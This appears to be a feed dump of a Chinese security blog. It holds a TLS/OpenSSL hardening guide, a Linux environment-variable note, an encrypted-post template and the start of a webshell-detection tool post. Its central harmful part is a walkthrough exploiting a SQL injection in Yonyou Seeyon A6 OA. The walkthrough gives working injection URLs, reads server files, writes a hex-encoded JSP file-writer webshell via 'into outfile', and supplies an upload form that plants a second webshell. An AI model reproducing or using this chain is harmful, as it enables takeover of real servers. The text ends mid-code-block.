href="#2-4-1-Cookie-Security" class="headerlink" title="2.4.1 Cookie Security"></a>2.4.1 Cookie Security</h4><p>包含敏感信息的 cookie，特别是会话 id，需要标记为安全的，假设网站是通过 HTTPS 传输的。这会阻止 cookie 通过 HTTP 发送明文文本。另一种方法是通过 HSTS 来阻止非安全 cookie 在 HTTP 上传输。建议使用安全 cookie 和 HSTS。</p><p>会话 cookie 应该与 HttpOnly 值进行标记，以防止它们被 javascript 访问。这可以防止攻击者利用 XSS 窃取会话 cookie。其他 cookie 可能不需要这样标记。但是，除非有明确的需要从 javascript 中访问他们的值，否则最好还是呆在安全的一边，把所有cookie标记为 HttpOnly</p><blockquote><p>建议<br><br>标记所有 cookie 安全和 HttpOnly。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: <span class="attribute">Key</span>=Value; <span class="attribute">path</span>=/; secure; HttpOnly, <span class="attribute">Key2</span>=Value2; secure; HttpOnly</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="0x03-服务器软件安全"><a href="#0x03-服务器软件安全" class="headerlink" title="0x03 服务器软件安全"></a>0x03 服务器软件安全</h2><p>我们在最佳实践文章中建议大家如何去配置协议和密码套件，但是如果服务器软件（nginx、apache等）所使用的ssl协议库存在SSL漏洞，或者不支持那些现代化的密码套件和特性，那么无论你如何去修改配置都无法改善现在的安全问题。</p><p>所以我们在配置前，或者发现按照推荐配置进行了调整《<a href="https://myssl.com/" target="_blank" rel="noopener">SSL/TLS安全评估报告</a>》还是无法满足要求，那么可以检查下所使用的OpenSSL等加密库是否版本过低。</p><h3 id="3-1-如何检查OpenSSL版本"><a href="#3-1-如何检查OpenSSL版本" class="headerlink" title="3.1 如何检查OpenSSL版本"></a>3.1 如何检查OpenSSL版本</h3><h4 id="3-1-1-nginx"><a href="#3-1-1-nginx" class="headerlink" title="3.1.1 nginx"></a>3.1.1 nginx</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nginx -V</span><br><span class="line"></span><br><span class="line">nginx <span class="built_in">version</span>: nginx/<span class="number">1.10</span><span class="number">.2</span></span><br><span class="line">built <span class="keyword">by</span> gcc <span class="number">4.8</span><span class="number">.5</span> <span class="number">20150623</span> (Red Hat <span class="number">4.8</span><span class="number">.5</span><span class="number">-4</span>) (GCC)</span><br><span class="line">built <span class="keyword">with</span> OpenSSL <span class="number">1.0</span><span class="number">.1</span>e-fips <span class="number">11</span> Feb <span class="number">2013</span></span><br><span class="line">TLS SNI support enabled</span><br></pre></td></tr></table></figure><p>或者通过openssl命令查看(适用于非自己通过openssl源码编译的）<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl <span class="built_in">version</span></span><br></pre></td></tr></table></figure></p><p>推荐的OpenSSL版本</p><ol><li>OpenSSL 1.0.2用户需更新到1.0.2h 以上。</li><li>OpenSSL 1.0.1用户需更新到1.0.1t 以上。</li><li>OpenSSL官方已停止对 0.9.8和 1.0.0 两个版本的升级维护，请使用这两个版本的用户将其升级至1.0.2h版本以上。</li></ol><blockquote><p>OpenSSL 1.0.1以下不支持tls1.2<br><br>升级前请做好测试</p></blockquote><h3 id="3-2-漏洞事件"><a href="#3-2-漏洞事件" class="headerlink" title="3.2 漏洞事件"></a>3.2 漏洞事件</h3><p><a href="https://www.trustasia.com/openssl-heartbleed" target="_blank" rel="noopener">https://www.trustasia.com/openssl-heartbleed</a></p><ul><li>OpenSSL 1.0.1g 已修复该漏洞</li><li>OpenSSL 1.0.0 分支版本不受此漏洞影响</li><li>OpenSSL 0.9.8 分支版本不受此漏洞影响</li><li>OpenSSL 1.0.2 Beta2 不受此漏洞影响<br><a href="https://myssl.com/heartbleed.html" target="_blank" rel="noopener">Heartbleed检测工具(使用多个工具测试，防止误报)</a></li></ul><p><a href="https://www.trustasia.com/OpenSSL-DROWN-attack" target="_blank" rel="noopener">https://www.trustasia.com/OpenSSL-DROWN-attack</a></p><ul><li>OpenSSL 1.0.1h+</li><li>OpenSSL 1.0.0m+</li><li>OpenSSL 0.9.8za+</li></ul><p><a href="https://www.trustasia.com/OpenSSL-CVE-2016-2107-Padding-Oracle" target="_blank" rel="noopener">https://www.trustasia.com/OpenSSL-CVE-2016-2107-Padding-Oracle</a></p><ul><li>OpenSSL 1.0.2用户需更新到1.0.2h 。</li><li>OpenSSL 1.0.1用户需更新到1.0.1t 。</li><li>使用包管理系统的用户可以直接更新到2016年5月3日 之后的版本。<br><a href="https://myssl.com/cbc_oracle.html" target="_blank" rel="noopener">CBC padding oracle检测 检测工具&gt;&gt;</a></li></ul><p>OpenSSL CCS漏洞<br><br>此漏洞是 OpenSSL ChangeCipherSpec 设计缺陷造成，被称为 CCS 注入漏洞。<br><br><a href="https://www.trustasia.com/openssl-ccs" target="_blank" rel="noopener">https://www.trustasia.com/openssl-ccs</a></p><ul><li>OpenSSL 1.1.0 应升级到 1.1.0a 或更高版本。</li><li>OpenSSL 1.0.2 应升级到 1.0.2i 或更高版本。</li><li>OpenSSL 1.0.1 应升级到 1.0.1u 或更高版本。<br><a href="https://myssl.com/ccs.html" target="_blank" rel="noopener">OpenSSL CCS 检测工具&gt;&gt;</a></li></ul><blockquote><p>注意：<br><br>OpenSSL官方已停止对 0.9.8和 1.0.0 两个版本的升级维护，请使用这两个版本的用户将其升级至更高版本。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;原文：&lt;a href=&quot;https://blog.myssl.com/ssl-and-tls-deployment-best-practices/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.myssl.com/ssl-and-tls-deployment-best-practices/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;SSL/TLS 是一种简单易懂的技术，它很容易部署及运行。但想要部署的安全通常是不容易的。这也使系统管理员和开发者不得不去了解 SSL 和 TLS 相关的技术，掌握如何配置一个安全的 web 服务器或应用。无疑会耗费很大的精力去看相关的技术文档，乏味且宽泛。&lt;/p&gt;
&lt;p&gt;本篇文档的目的在于如何让系统管理员或开发者用尽可能少的时间部署一个安全的 web 站点或应用，即 SSL 和 TLS 部署最佳实践。&lt;/p&gt;
&lt;h2 id=&quot;0x01-SSL-TLS部署&quot;&gt;&lt;a href=&quot;#0x01-SSL-TLS部署&quot; class=&quot;headerlink&quot; title=&quot;0x01 SSL/TLS部署&quot;&gt;&lt;/a&gt;0x01 SSL/TLS部署&lt;/h2&gt;&lt;h3 id=&quot;1-1-证书和私钥&quot;&gt;&lt;a href=&quot;#1-1-证书和私钥&quot; class=&quot;headerlink&quot; title=&quot;1.1 证书和私钥&quot;&gt;&lt;/a&gt;1.1 证书和私钥&lt;/h3&gt;&lt;p&gt;在TLS中，所有的安全性都从服务器的密码标识开始；需要一个强大的私钥来防止攻击者进行模拟攻击。同样重要的是要有一个有效的和强大的证书，这将授予私有密匙作为一个特定主机名的权利。没有这两个基本的构建块，就没有其他东西可以安全了。&lt;/p&gt;
&lt;h4 id=&quot;1-1-1-使用-2048-位私钥&quot;&gt;&lt;a href=&quot;#1-1-1-使用-2048-位私钥&quot; class=&quot;headerlink&quot; title=&quot;1.1.1 使用 2048 位私钥&quot;&gt;&lt;/a&gt;1.1.1 使用 2048 位私钥&lt;/h4&gt;&lt;p&gt;对于大多数的 web 站点，提供一个 2048 的 RSA key 是足够安全的。
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="HTTPS" scheme="http://www.pa55w0rd.club/tags/HTTPS/"/>
    
  </entry>
  
  <entry>
    <title>encrypt_test</title>
    <link href="http://www.pa55w0rd.club/encrypt-test/"/>
    <id>http://www.pa55w0rd.club/encrypt-test/</id>
    <published>2018-12-05T08:47:53.000Z</published>
    <updated>2018-12-05T08:49:54.991Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">U2FsdGVkX19EVTvkqyzSgfd8dsp6fOgmtrGq/MSr3JX/0Jh8fML4OZCLEzsm+4GQOJ2Ion8IKVZJOQONLfgU+dtyGArAJW82EkW+fZjhdWLJuNAmcL3Uh3teuCVHwCo/OB71M6ANiIMOgWYZ9xmrTn/ktwgXuvx9+OKSqbOMRkEdIzL35P/8fDHJL6pvLvXbcnFIA5Qqig5xxR3DUkDUkTa+DnKir+8aRoTGmEP+CeD1RFw14GEbJ3R1eO2CPTxgPVrtOLPNUxgLVRemRyjABXwEmM8j3ub/JhLZKvvVgLvuo6ntppeqxJBD+BfW6ZV0wAJDpPNezTNRgJ78QZNuNRrjIfGb9Bg/TWSg4G4pqYi40IGxFEJKfY6GhCRFS5KfC4x6wtHC171CBQVcVwkhFRs7z6F+3siieHCr0MfTSrI/QrEeholwqjU9NXrOmtwVAKqRy0TVId2Es6SwZgpZgWqWo9vZD0KvfDZElWdJM1yUDvQAKcC0IQGWgRD0i58GQK4ohfUZKMwq6WqYR8FxSJH1li4MoVv6tFioqfySX4TaJ/Ppfg69OfkiQhEz4Mjfr8F8kWBt8dtTKZa+IdNiW4e7H7d4Q/lfEpb8mXwP91rlZ4PJMKdSpO2juifIVsJGHekBu3RtERDxJrfWAfIDLBm7gcJZYGLJDb/anMlMtSh/uLT/Dbom1FvP/iQZxuQjJmD9caFjmJIS/s3t+dojJEkxWlH8kIlOISXo5gJuSlXCDNhBXR52HAaaooqShctA5pGxk1zwKrqjHvdtyvHIkGqnyWTE0p0N9/v9uw5kSV86I180IalnF/2NepNpj7bJOhpzmq66+d5g3oCE2+z4LV7S4Rj5lq/NtkWiivuvqngbXPoZwCPRp4onXQm0o3JF+49F1EbtDIBc15moDqLj2jYvYbPuwdaCA5r4bp8c2rhYEMl2vpNlkusGbbr+unwjxZzD6pu7G6e/9uDtr9IBvmRsZ8VcjqwLFOBYa/V64dMw6yuLqmQavD6G0i+gdmh/7f9iW+rVvfnOkqXai6ahOwFqc2rbtpggtEKHemLwbPM4/XByALxJ6kpwaP7KljnqTLsfulcqiGem0hwCqezej7maz8wIuMlJbluqODhPLscQKyMueg3yxTK8sG/1OrhtYbX4y5mCOeNvCIioFEWKbGChqJx8jgF5UASMpzxkPKbsiUFOThlKV+J4RcrWtJdxSaSw/zlXu8OHo5BuvoBLOTXM0uUbz+wzLSD+FvwcgVrbWzftSh68ic6N+eNY2xIbAxMR8cyDGcvQjmNxH1FVrs+a4YKASrGc1k4DkTHUFX6H0MYkcCGS2mV3185IMTUqkpuPMom00b6dzv3rcsVF+tY2qlk/hM2+OfyiBBLp4oBSgYNLWtpgkztf8TU/ZYo101kZMMRFsKZ/pEPTRSLu8JiezIi8uwQhGHBQqXkwqgwCwHK0mt5r9DVx6V/UUna90RDWRCED+yOByH7yzUQnlNkEl4vBYfMAWzWGOEzmb7g2uN+JqbhTMX6iql56lQSUesQdAIGl3c1F+ca/68Ud419mBb1jQtKjb/l2nw2YtN4J5pExcYUB40Pjmq684Iau5Lagd1xlNL45pTfaQe5i74iEOaBNoyzjBVzspNfFkuu4zX0G8feVBXx0F9VcA+LwCpPfizwDkbWb74GMNrHpnVxPEXBdUnZwIw/p2DdfeOW5V7Pz3NhQcq1Ox1Jag1fF</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;如不需要对文章进行加密请去掉&quot;&gt;&lt;a href=&quot;#如不需要对文章进行加密请去掉&quot; class=&quot;headerlink&quot; title=&quot;如不需要对文章进行加密请去掉&quot;&gt;&lt;/a&gt;如不需要对文章进行加密请去掉&lt;/h1&gt;&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;encrypt:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;enc_pwd:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;123456&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;如不需要目录请去掉&quot;&gt;&lt;a href=&quot;#如不需要目录请去掉&quot; class=&quot;headerlink&quot; title=&quot;如不需要目录请去掉&quot;&gt;&lt;/a&gt;如不需要目录请去掉&lt;/h1&gt;&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;toc:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;添加摘要&quot;&gt;&lt;a href=&quot;#添加摘要&quot; class=&quot;headerlink&quot; title=&quot;添加摘要&quot;&gt;&lt;/a&gt;添加摘要&lt;/h1&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux环境变量设置</title>
    <link href="http://www.pa55w0rd.club/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE/"/>
    <id>http://www.pa55w0rd.club/环境变量设置/</id>
    <published>2018-12-05T06:56:46.000Z</published>
    <updated>2018-12-05T07:27:47.655Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-查看环境变量"><a href="#0x00-查看环境变量" class="headerlink" title="0x00 查看环境变量"></a>0x00 查看环境变量</h2><p>查看环境变量有三个命令：</p><ul><li>env：env命令是environment的缩写，用于列出所有的环境变量</li><li>export：单独使用export命令也可以像env列出所有的环境变量，不过export命令还有其他额外的功能</li><li><code>echo $PATH</code>：<code>echo $PATH</code>用于列出变量PATH的值，里面包含了已添加的目录</li></ul><a id="more"></a><h2 id="0x01-设置环境变量"><a href="#0x01-设置环境变量" class="headerlink" title="0x01 设置环境变量"></a>0x01 设置环境变量</h2><h3 id="1-1-将路径加入到PATH"><a href="#1-1-将路径加入到PATH" class="headerlink" title="1.1 将路径加入到PATH"></a>1.1 将路径加入到PATH</h3><p>可以直接添加到环境变量PATH中。$PATH表示变量PATH的值，包含已有的目录。</p><p>这种方法需要注意路径的顺序，如果遇到有同名的命令，那么PATH里面哪个目录先被查询，则那个目录下的命令就会被先执行，如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加到PATH末尾</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/path/to/your/dir</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加到PATH开头</span></span><br><span class="line"><span class="built_in">export</span> PATH=/path/to/your/dir:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure></p><h3 id="1-2-命名一个新的环境变量"><a href="#1-2-命名一个新的环境变量" class="headerlink" title="1.2 命名一个新的环境变量"></a>1.2 命名一个新的环境变量</h3><p>也可以直接命名一个新的环境变量，用于其它程序引用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> VAR_NAME=value</span><br></pre></td></tr></table></figure></p><h2 id="0x02-作用域"><a href="#0x02-作用域" class="headerlink" title="0x02 作用域"></a>0x02 作用域</h2><h3 id="2-1-作用于当前终端"><a href="#2-1-作用于当前终端" class="headerlink" title="2.1 作用于当前终端"></a>2.1 作用于当前终端</h3><p>打开一个终端，输入添加环境变量的语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CLASS_PATH=./JAVA_HOME/lib:<span class="variable">$JAVA_HOME</span>/jre/lib</span><br></pre></td></tr></table></figure></p><p>终端所添加的环境变量是临时的，只适用于当前终端，关闭当前终端或在另一个终端中，添加的环境变量无效。</p><h3 id="2-2-作用于当前用户"><a href="#2-2-作用于当前用户" class="headerlink" title="2.2 作用于当前用户"></a>2.2 作用于当前用户</h3><p>如果只需要添加的环境变量对当前用户有效，可以写入用户主目录下的.bashrc文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure></p><p>添加语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CLASS_PATH=./JAVA_HOME/lib:<span class="variable">$JAVA_HOME</span>/jre/lib</span><br></pre></td></tr></table></figure></p><p>注销或者重启可以使修改生效，如果要使添加的环境变量马上生效：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure></p><h3 id="2-3-作用于所有用户"><a href="#2-3-作用于所有用户" class="headerlink" title="2.3 作用于所有用户"></a>2.3 作用于所有用户</h3><p>要使环境变量对所有用户有效，可以修改profile文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br></pre></td></tr></table></figure></p><p>添加语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CLASS_PATH=./JAVA_HOME/lib:<span class="variable">$JAVA_HOME</span>/jre/lib</span><br></pre></td></tr></table></figure></p><p>注销或者重启可以使修改生效，如果要使添加的环境变量马上生效：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure></p><hr><p><strong>说明：</strong></p><p>bash首先执行/etc/profile脚本,/etc/profile脚本先依次执行/etc/profile.d/*.sh </p><p>随后bash会执行用户主目录下的.bash_profile脚本,.bash_profile脚本会执行用户主目录下的.bashrc脚本,<br>而.bashrc脚本会执行/etc/bashrc脚本</p><p>至此,所有的环境变量和初始化设定都已经加载完成</p><p>bash随后调用terminfo和inputrc，完成终端属性和键盘映射的设定</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-查看环境变量&quot;&gt;&lt;a href=&quot;#0x00-查看环境变量&quot; class=&quot;headerlink&quot; title=&quot;0x00 查看环境变量&quot;&gt;&lt;/a&gt;0x00 查看环境变量&lt;/h2&gt;&lt;p&gt;查看环境变量有三个命令：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;env：env命令是environment的缩写，用于列出所有的环境变量&lt;/li&gt;
&lt;li&gt;export：单独使用export命令也可以像env列出所有的环境变量，不过export命令还有其他额外的功能&lt;/li&gt;
&lt;li&gt;&lt;code&gt;echo $PATH&lt;/code&gt;：&lt;code&gt;echo $PATH&lt;/code&gt;用于列出变量PATH的值，里面包含了已添加的目录&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="linux" scheme="http://www.pa55w0rd.club/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>用友致远A6 OA存在sql注入并拿shell</title>
    <link href="http://www.pa55w0rd.club/yyoa/"/>
    <id>http://www.pa55w0rd.club/yyoa/</id>
    <published>2018-12-04T08:11:57.000Z</published>
    <updated>2018-12-04T09:00:29.022Z</updated>
    
    <content type="html"><![CDATA[<p>用友致远A6协同系统 <code>/yyoa/common/js/menu/test.jsp</code> 文件 S1 参数SQL注入漏洞 </p><p>注入点为S1变量，通过探测，发现是mysql数据库</p><p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=</code></p><p>于是构造注入语句查询数据库名：</p><p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20database())</code></p><a id="more"></a><table><thead><tr><th>序号</th><th>database()</th></tr></thead><tbody><tr><td>1</td><td>mysql3235</td></tr></tbody></table><p>Mysql注入中，我们使用into outfile 来写入数据，用此方法注入webshell，前提条件两个：</p><p>1：root权限</p><p>2：物理路径</p><p>我们探测一下web根目录</p><p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20@@basedir)</code></p><table><thead><tr><th>序号</th><th>@@basedir</th></tr></thead><tbody><tr><td>1</td><td>F:/UFseeyon/OA/mysql/bin/../</td></tr></tbody></table><p>通过yyoa目录结构猜测物理路径为</p><p><code>F:/UFseeyon/OA/tomcat/webapps/yyoa/</code></p><p>可以使用load_file判断是否正确</p><p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20load_file(%27F:/UFseeyon/OA/tomcat/webapps/yyoa/WEB-INF/web.xml%27)</code></p><p>利用mysql into outfile写shell：由于jsp一句话超长，请求连接会拒绝，故先上传写文件脚本，再本地构造进行webshell上传：<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">"f"</span>)!=<span class="keyword">null</span>)(<span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">"\\"</span>)+request.getParameter(<span class="string">"f"</span>))).write(request.getParameter(<span class="string">"t"</span>).getBytes());%&gt;</span><br></pre></td></tr></table></figure></p><p>由于特殊符号存在，URL编码会造成写入后代码错误，故采用hex编码后unhex处理上传，写入文件名为：he1p.jsp</p><p><a href="http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27" target="_blank" rel="noopener">http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27</a></p><p>本地构造上传：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://xx/yyoa/he1p.jsp?f=we1come.jsp"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">t</span> <span class="attr">cols</span>=<span class="string">120</span> <span class="attr">rows</span>=<span class="string">10</span> <span class="attr">width</span>=<span class="string">45</span>&gt;</span>your code<span class="tag">&lt;/<span class="name">testarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>上传后获取webshell地址为：<a href="http://xx/yyoa/we1come.jsp" target="_blank" rel="noopener">http://xx/yyoa/we1come.jsp</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用友致远A6协同系统 &lt;code&gt;/yyoa/common/js/menu/test.jsp&lt;/code&gt; 文件 S1 参数SQL注入漏洞 &lt;/p&gt;
&lt;p&gt;注入点为S1变量，通过探测，发现是mysql数据库&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;amp;S1=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;于是构造注入语句查询数据库名：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;amp;S1=(SELECT%20database())&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="sql注入" scheme="http://www.pa55w0rd.club/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Linux后门入侵检测工具使用</title>
    <link href="http://www.pa55w0rd.club/linux-backdoor-killer/"/>
    <id>http://www.pa55w0rd.club/linux-backdoor-killer/</id>
    <published>2018-12-03T07:07:05.000Z</published>
    <updated>2018-12-04T08:58:50.674Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-描述"><a href="#0x00-描述" class="headerlink" title="0x00 描述"></a>0x00 描述</h2><p>当我们的应用系统被入侵后，系统是否已被黑客上传webshell甚至植入木马后门程序。如果依靠人工排查，一是工作量大，二是需要一定程度的技术知识和业务知识才能判断什么是正常什么是异常。工作量大决定排查工作不可能由个别具有技术知识和业务知识的人来完成工作而需要其他人员参与，而如果这些没有“一定程度的技术知识和业务知识”的人员参与基本必然后导致大量的误报和漏报（主要是漏报）。总而言之，在大量设备场景中人工排查后门是很难切实有效推行的排查手段。</p><h2 id="0x01-Webshell查杀"><a href="#0x01-Webshell查杀" class="headerlink" title="0x01 Webshell查杀"></a>0x01 Webshell查杀</h2><h3 id="1-1-D盾-Web查杀"><a href="#1-1-D盾-Web查杀" class="headerlink" title="1.1 D盾_Web查杀"></a>1.1 D盾_Web查杀</h3><p>D盾Web查杀是一个永久免费的网站D盾Web查杀，软件使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为</p><p>引擎特别针对：一句话后门、变量函数后门、${}执行、`执行、preg_replace执行、call_user_func、file_put_contents、fputs 等特殊函数的参数进行针对性的识别，能查杀更为隐藏的后门，并把可疑的参数信息展现在你面前，让你能更快速的了解后门的情况</p><blockquote><p>PS: 不再更新D盾_web查杀的查杀引擎,只更新查杀库到2019.1.1，之后将不再更新查杀库<br><a id="more"></a></p></blockquote><h4 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h4><p><a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip" target="_blank" rel="noopener">D盾_WEB查杀V2.0.9 下载链接</a></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 